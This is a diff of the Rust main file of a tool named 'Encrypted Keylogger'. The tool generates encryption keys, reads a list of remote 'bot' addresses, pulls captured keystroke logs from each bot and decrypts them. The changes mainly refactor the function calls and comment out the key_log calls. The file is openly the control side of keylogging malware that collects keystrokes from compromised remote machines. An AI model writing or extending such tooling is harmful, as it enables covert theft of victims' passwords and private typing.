@@ -2,6 +2,7 @@
 extern crate clap;
 
 extern crate keylogger_lib;
+use keylogger_lib::*;
 
 fn main() {
     let args = clap::App::new("Encrypted Keylogger")
@@ -43,7 +44,7 @@ fn main() {
 //            .long("key")
 //            .takes_value(true)
 //            .value_name("FILE")
-            .required_unless("asymmetric_keys"))
+             )
         .get_matches();
 
     if args.is_present("generate") {
@@ -52,28 +53,28 @@ fn main() {
             if data.len() != 2 {
                 panic!("Asymmetric flag missing second argument")
             }
-            if let Err(err) = keylogger_lib::gen_key_pair(data[0], data[1]) {
+            if let Err(err) = gen_key_pair(data[0], data[1]) {
                 println!("{}", err.description());
             } else {
                 println!("Public and private key generated");
             }
         } else {
             let key_path = args.value_of("KEY").unwrap();
-            keylogger_lib::generate_key_and_nonce(key_path).expect("Key generation failed");
+            generate_key_and_nonce(key_path).expect("Key generation failed");
         }
         return;
     }
 
     if let Some(retrieve_path) = args.value_of("retrieve") {
         let retrieve_path = std::path::Path::new(retrieve_path);
-        let bot_addr_list = keylogger_lib::parse_bot_list(args.value_of("bot_addr").unwrap_or("bot_addr.list")).unwrap_or_else(|err| {
+        let bot_addr_list = parse_bot_list(args.value_of("bot_addr").unwrap_or("bot_addr.list")).unwrap_or_else(|err| {
             println!("Error with bot-address-list path: {}", err);
             std::process::exit(1);
         });
 
         //TODO: make retrieval streamified
         let encrypted_data_paths: Vec<Vec<std::path::PathBuf>> = bot_addr_list.iter().map(|bot_addr| {
-            keylogger_lib::retrieve_remote_keylogs(bot_addr).iter().map(|&(ref name, ref data)| {
+            retrieve_remote_keylogs(bot_addr).iter().map(|&(ref name, ref data)| {
                 use std::io::Write;
                 let output_path = retrieve_path.join(format!("{}_{}", bot_addr.split(":").collect::<Vec<&str>>()[0], name));
 
@@ -100,10 +101,10 @@ fn main() {
                     println!("Asymmetric flag missing second argument");
                     return;
                 }
-                keylogger_lib::decrypt_asym(path.to_str().unwrap(), data[0], data[1])
+                decrypt_asym_sym(path.to_str().unwrap(), data[0], data[1], args.value_of("KEY").unwrap())
                     .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
             } else {
-                keylogger_lib::decrypt_sym(path.to_str().unwrap(), args.value_of("KEY").unwrap())
+                decrypt_sym(path.to_str().unwrap(), args.value_of("KEY").unwrap())
                     .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
             }
         }
@@ -111,34 +112,33 @@ fn main() {
         return;
     }
 
-
     if let Some(decrypt_path) = args.value_of("decrypt") {
         if let Some(data) = args.values_of("asymmetric_keys") {
             let data: Vec<&str> = data.collect();
             if data.len() != 2 {
-                println!("{}", data.len());
                 println!("Asymmetric flag missing second argument");
                 return;
             }
-            keylogger_lib::decrypt_asym(decrypt_path, data[0], data[1])
+
+            decrypt_asym_sym(decrypt_path, data[0], data[1], args.value_of("KEY").unwrap())
                 .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
         } else {
-            keylogger_lib::decrypt_sym(decrypt_path, args.value_of("KEY").unwrap())
+            decrypt_sym(decrypt_path, args.value_of("KEY").unwrap())
                 .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
         }
     } else {
         let key_path = args.value_of("KEY").unwrap();
         if args.is_present("asymmetric") {
-            if let Err(problem) = keylogger_lib::get_public_key(key_path) {
+            if let Err(problem) = get_public_key(key_path) {
                 println!("Error with key input: {}", problem.description());
             } else {
-                keylogger_lib::key_log(args.value_of("KEY").unwrap(), true);
+                //key_log(&EncryptionType::Asymmetric(args.value_of("KEY").unwrap().to_owned()));
             }
         } else {
-            if let Err(problem) = keylogger_lib::generate_key_and_nonce(key_path) {
+            if let Err(problem) = generate_key_and_nonce(key_path) {
                 println!("Error with key input: {}", problem.description());
             } else {
-                keylogger_lib::key_log(key_path, false);
+                //key_log(&EncryptionType::Symmetric(args.value_of("KEY").unwrap().to_owned()));
             }
         }
     }
